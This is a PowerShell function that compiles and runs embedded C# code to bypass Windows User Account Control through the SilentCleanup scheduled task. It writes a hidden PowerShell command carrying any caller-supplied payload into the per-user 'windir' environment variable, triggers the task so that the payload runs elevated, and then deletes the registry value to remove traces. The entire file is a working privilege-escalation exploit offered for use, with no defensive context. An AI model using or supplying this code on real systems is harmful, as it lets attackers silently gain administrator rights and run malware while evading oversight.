function UAC-SilentCleanupBypass {
    param(
        [Parameter(Mandatory = $True)]
        [String]$Command
    )

    $assemblies=(
    	"System"
    )

    $source=@"
using System;
using Microsoft.Win32;
using System.Diagnostics;
namespace Helloworld
{
	public static class Hello{
		public static void Main(){
			Console.WriteLine("Hello, world!");
            Console.WriteLine("[+] Starting Bypass UAC.");
            string payload = @"$($Command)";
            Console.WriteLine("[+] Will launch command: " + payload);
            try
            {
                // Registry Key Modification
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(@"Environment");
                key.SetValue("windir", "powershell -w hidden -c \"& '" + payload + "'\";#", RegistryValueKind.String);
                key.Close();
                Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Create the Enviroment Variabled %windir%.");
                Console.WriteLine("[-] Exit.");
            }
            Console.WriteLine("[+] Waiting 5 seconds before execution.");
            System.Threading.Thread.Sleep(5000);
            // Trigger the UAC Bypass 
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "schtasks.exe";
                startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";
                Process.Start(startInfo);
                Console.WriteLine("[+] UAC Bypass Application Executed.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Execute the Application schtasks.exe to perform the bypass.");
            }
            
            DeleteKey();
            Console.WriteLine("[-] Exit.");
        }
        static void DeleteKey()
        {
            Console.WriteLine("[+] Registry Cleaning will start in 5 seconds.");
            System.Threading.Thread.Sleep(5000);
            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(@"Environment",true);
                // Validate if the Key Exist
                if (rkey != null)
                {
                    try
                    {
                        rkey.DeleteValue("windir");
                        rkey.Close();
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine(@"[-] Unable to Delete the Registry key (Environment). Error "+err.Message);
                    }
                }
                Console.WriteLine("[+] Registry Cleaned.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Clean the Registry.");
            }
		}
	}
}
"@

    Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $source -Language CSharp
    [HelloWorld.Hello]::Main()
}
